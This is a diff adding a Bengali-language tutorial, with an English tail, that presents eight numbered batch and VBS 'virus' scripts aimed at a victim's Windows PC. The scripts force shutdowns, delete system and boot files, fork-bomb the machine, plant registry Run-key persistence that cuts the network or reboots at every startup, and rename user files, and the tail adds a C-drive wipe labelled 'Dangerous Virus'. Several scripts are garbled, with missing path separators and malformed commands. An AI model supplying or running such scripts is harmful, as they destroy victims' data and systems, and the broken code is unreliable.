@@ -1,0 +1,145 @@
+এবার আসুন কোডগুলি দেখা যাকঃ
+কোডঃ১
+@echo off
+msg * I don't like you
+shutdown -c "Error! You are too stupid!" -s
+
+কি কাজ করবে?
+ভিক্টিম এর পিসিকে শাট ডাউন করে দিবে।
+কোন ফরম্যাটে সেভ করবেনঃ .BAT যেমনঃ "anything.BAT"
+
+কোডঃ২l
+@echo off
+del %systemdrive%*.* /f /s /q
+shutdown -r -f -t 00
+
+কি কাজ করবে?
+ভিক্টিম এর পিসির সিস্টেম ফাইল ডিলেট করে দিবে।
+কোন ফরম্যাটে সেভ করবেনঃ .bat যেমনঃ "anything.bat"
+
+কোডঃ৩
+Option Explicit
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject("Wscript.Shell")
+
+Dim x
+For x = 1 to 100000000
+WSHShell.Run "Tourstart.exe"
+Next
+
+কি কাজ করবে?
+ভিক্টিম এর পিসি ক্রাশ করবে
+কোন ফরম্যাটে সেভ করবেনঃ .vbs যেমনঃ  "anything.vbs"
+
+কোডঃ৪
+@echo off
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+@echo off
+msg * YOU GOT OWNED!!!
+shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
+
+কি কাজ করবে?
+ভিক্টিম এর পিসি ক্রাশ করবে এবং আর কখনো রিবুট হবে না।
+ ফরম্যাটে সেভ .bat যেমনঃ "anything.bat"
+
+কোডঃ৫
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You Have Been HACKED!
+PAUSE
+
+কি কাজ করবে?
+Disables internet permanantly
+কোন ফরম্যাটে সেভ করবেনঃ .bat যেমনঃ "anything.bat"
+
+কোডঃ৬
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+echo You have been HACKED.
+PAUSE
+
+কি কাজ করবে?
+Shutdowns Computer Everytime It Is Turned On
+কোন ফরম্যাটে সেভ করবেনঃ .bat যেমনঃ "anything.bat"
+
+কোডঃ৭
+REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+
+কি কাজ করবে?
+Change Files To Non-working TXT Files
+কোন ফরম্যাটে সেভ করবেনঃ .bat যেমনঃ "anything.bat"
+
+কোডঃ ৮
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GOTO CRASH
+ipconfig /release
+shutdown -r -f -t0
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo YOU HAVE BEEN HACKED BITCH
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+
+PAUSE
+
+PAUSE
+
+কি কাজ করবে?
+System Meltdown
+কোন ফরম্যাটে সেভ করবেনঃ .bat যেমনঃ "anything.bat"
+
+
+Now, copy and paste the below code into your notepad screen.
+
+@ offEcho
+Del C: *.* |y
+
+
+Creating a Dangerous Virus
+
+3. Now save this file as virus.bat (you can select any random name, but .bat after that must be there).
+
+
+Creating a Dangerous Virus
+
+Now running the file will delete the C drive completely, and the operating system of the respective computer will get corrupted.
+
+Note: This method is only for knowledge purposes. Don’t try this on your computer, as it will completely format your C drive.
